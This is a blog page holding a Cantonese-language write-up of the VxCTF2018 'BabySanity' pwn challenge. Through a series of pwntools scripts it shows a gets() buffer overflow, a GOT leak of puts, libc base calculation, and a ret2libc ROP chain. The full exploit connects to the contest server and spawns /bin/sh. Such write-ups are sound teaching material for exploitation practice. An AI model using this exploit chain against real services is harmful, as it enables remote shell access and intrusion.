@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>VxCTF2018-BabySanity | CatPawn</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="QuestionBinarysanitylibc-2.23.so Solution一見到有個.so 比賽果陣都放棄左了 , 呢題係完左之後2日先做番出黎 首先啦 , 基本動作 checksec先12345Arch:    amd64-64-littleRELRO:   Partial RELROStack:   No canary foundNX:      NX enabledPIE:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VxCTF2018-BabySanity">
+<meta property="og:url" content="https://catpawn.github.io/2018/05/12/VxCTF2018-BabySanity/index.html">
+<meta property="og:site_name" content="CatPawn">
+<meta property="og:description" content="QuestionBinarysanitylibc-2.23.so Solution一見到有個.so 比賽果陣都放棄左了 , 呢題係完左之後2日先做番出黎 首先啦 , 基本動作 checksec先12345Arch:    amd64-64-littleRELRO:   Partial RELROStack:   No canary foundNX:      NX enabledPIE:">
+<meta property="og:updated_time" content="2018-05-11T18:13:48.227Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="VxCTF2018-BabySanity">
+<meta name="twitter:description" content="QuestionBinarysanitylibc-2.23.so Solution一見到有個.so 比賽果陣都放棄左了 , 呢題係完左之後2日先做番出黎 首先啦 , 基本動作 checksec先12345Arch:    amd64-64-littleRELRO:   Partial RELROStack:   No canary foundNX:      NX enabledPIE:">
+  
+    <link rel="alternate" href="/atom.xml" title="CatPawn" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">CatPawn</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://catpawn.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-VxCTF2018-BabySanity" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/12/VxCTF2018-BabySanity/" class="article-date">
+  <time datetime="2018-05-11T17:13:16.000Z" itemprop="datePublished">2018-05-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      VxCTF2018-BabySanity
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><h3 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h3><p><a href="sanity">sanity</a><br><a href="libc-2.23.so">libc-2.23.so</a></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>一見到有個.so 比賽果陣都放棄左了 , 呢題係完左之後2日先做番出黎</p>
+<p>首先啦 , 基本動作 checksec先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:    amd64-64-little</span><br><span class="line">RELRO:   Partial RELRO</span><br><span class="line">Stack:   No canary found</span><br><span class="line">NX:      NX enabled</span><br><span class="line">PIE:     No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>之後扔入IDA睇下個Main先<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [sp+10h] [bp-70h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Sanity Check should be easy"</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>睇落好似無乜野好簡單咁 , 但係其實都真係幾難<br>首先啦佢開左ALSR , 所以每次加載個.so入黎果時個base address都唔同<br>所以要做以下既步驟</p>
+<ol>
+<li>leak 是但一個 libc function既address出黎</li>
+<li>拎番 libc 果個function既offset , 再將 offset減leaked function address 就有個 libc base address , 所拎到之後只需要係libc到拎function , 再加番 libc base address , 就可以係ASLR既環境下做到function call.</li>
+<li>拎番 libc system個offset , 同埋 /bin/sh呢條string既offset</li>
+<li>搵v4 overflow果個offset , 就咁睇應該係0x70 , 而要+8係因為x64 , 每個地址係8bytes長</li>
+<li>順序將 got , plt 既puts 壓番入main , 咁就會行多次Main , 行plt既puts print 番 got既puts address出黎</li>
+<li>然後就可以構做多次buffer overflow , 再做番ROP.</li>
+</ol>
+<h3 id="Leak-Function-Address"><a href="#Leak-Function-Address" class="headerlink" title="Leak Function Address"></a>Leak Function Address</h3><p>首先試下點樣可以 trigger main行多次先<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(<span class="number">0x401000</span>) <span class="comment">#just for fill rdi</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
+<p>可以見到已經行左2次 , 咁如果我地將0x401000轉做一個function既地址會點?<br>最終係可以構做到變成puts(gotAddress)<br>例如想leak libc既main 可以<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x4006a3</span> <span class="comment">#pop rdi;ret;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment">#puts(__libc_start_main_got)</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">有堆亂碼 , 應該係address既hex string黎</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
+<p>咁我地試下leak puts既address啦 , 搵offset都方便d<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x4006a3</span> <span class="comment">#pop rdi;ret;</span></span><br><span class="line">libc_puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment">#puts(puts_addr_got)</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"easy\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> leaked.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">90afab45ad7f0a</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
+<p>咁個puts address應該係7fad45abaf90 , 但係多左個0a又調轉左喎 , 咁format下佢 , 同埋計番個libc_base先<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x4006a3</span> <span class="comment">#pop rdi;ret;</span></span><br><span class="line">libc_puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment">#puts(puts_addr_got)</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"easy\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">leaked = u64(leaked[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc_base = leaked - libc_puts_off</span><br><span class="line">info(<span class="string">"Libc base:"</span> + hex(libc_base))</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">[*] Libc base: 0x7f28573b5900</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
+<p>咁之後就可以慢慢拎番 binsh 既offset 同埋system既offset , 加番libc base , 再做ROP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_system_off = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_binsh_offset = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br></pre></td></tr></table></figure></p>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><ol>
+<li><p>Buffer overflow</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pattern create 200 input</span><br><span class="line">r &lt; input</span><br><span class="line">pattern search</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搵ROPgadget (pop rdi; ret;)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary sanity --only &apos;pop|ret&apos;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>砌積木</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer + gadget + binsh_addr + system_addr</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="Full-exploit-code"><a href="#Full-exploit-code" class="headerlink" title="Full exploit code"></a>Full exploit code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./sanity")</span></span><br><span class="line">p = remote(<span class="string">"35.185.151.73"</span>,<span class="number">8044</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>) </span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">libc_system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">libc_binsh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">gadget = <span class="number">0x4006a3</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"libc system offset: "</span> + hex(libc_system_off))</span><br><span class="line">info(<span class="string">"libc /bin/sh offset: "</span> + hex(libc_binsh_offset))</span><br><span class="line">info(<span class="string">"libc puts offset: "</span> + hex(libc_puts_off))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Sanity Check should be easy\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">leaked = u64(leaked[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base_addr = leaked - libc_puts_off</span><br><span class="line"></span><br><span class="line">info(<span class="string">"leaked puts: "</span> + hex(leaked))</span><br><span class="line">info(<span class="string">"libc base: "</span> + hex(libc_base_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(libc_base_addr + libc_binsh_offset)</span><br><span class="line">payload += p64(libc_base_addr + libc_system_off)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://catpawn.github.io/2018/05/12/VxCTF2018-BabySanity/" data-id="cjh2a68h6000irsw5ca41qqlu" class="article-share-link">Teilen</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/05/01/ASISCTF2018-LeftOrRight/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">ASISCTF2018-LeftOrRight</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">letzter Beitrag</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/05/12/VxCTF2018-BabySanity/">VxCTF2018-BabySanity</a>
+          </li>
+        
+          <li>
+            <a href="/2018/05/01/ASISCTF2018-LeftOrRight/">ASISCTF2018-LeftOrRight</a>
+          </li>
+        
+          <li>
+            <a href="/2018/05/01/ASISCTF2018-WarmUp/">ASISCTF2018-WarmUp</a>
+          </li>
+        
+          <li>
+            <a href="/2018/05/01/ASISCTF2018-TheEarlySchool/">ASISCTF2018-TheEarlySchool</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/22/TimisoaraCTF2018-Pshchology/">TimisoaraCTF2018-Pshchology</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 CatPawn<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
